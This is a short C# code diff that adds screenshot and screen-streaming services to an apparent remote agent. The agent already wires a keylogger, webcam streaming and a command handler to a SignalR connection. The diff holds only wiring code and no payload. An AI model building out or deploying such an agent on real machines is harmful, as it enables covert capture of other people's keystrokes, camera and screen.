@@ -17,6 +17,8 @@ public class AgentDebugForm : Form
     // Services
     private readonly WebCamService _webCamService;
     private readonly KeyLoggerService _keyLoggerService;
+    private readonly ScreenshotService _screenshotService;
+    private readonly ScreenStreamService _screenStreamService;
 
     // ✅ NEW: SystemInfoService để truyền vào SignalRClientService ctor mới
     private readonly SystemInfoService _systemInfoService;
@@ -57,6 +59,8 @@ public class AgentDebugForm : Form
         _commandHandler = new CommandHandler();
         _webCamService = new WebCamService();
         _keyLoggerService = KeyLoggerService.Instance;
+        _screenshotService = new ScreenshotService();
+        _screenStreamService = new ScreenStreamService(_screenshotService);
 
         // ✅ NEW: init SystemInfoService
         _systemInfoService = new SystemInfoService();
@@ -64,6 +68,7 @@ public class AgentDebugForm : Form
         // Init SignalR (ctor mới)
         _signalRService = new SignalRClientService(_commandHandler, _systemInfoService, _configuration);
         _signalRService.SetWebCamService(_webCamService); // Wire webcam for streaming
+        _signalRService.SetScreenStreamService(_screenStreamService); // Wire screen streaming
         _signalRService.OnStatusChanged += (msg) => this.Invoke(() => UpdateStatus(msg));
         _signalRService.OnConnectionStateChanged += (state) => this.Invoke(() =>
         {
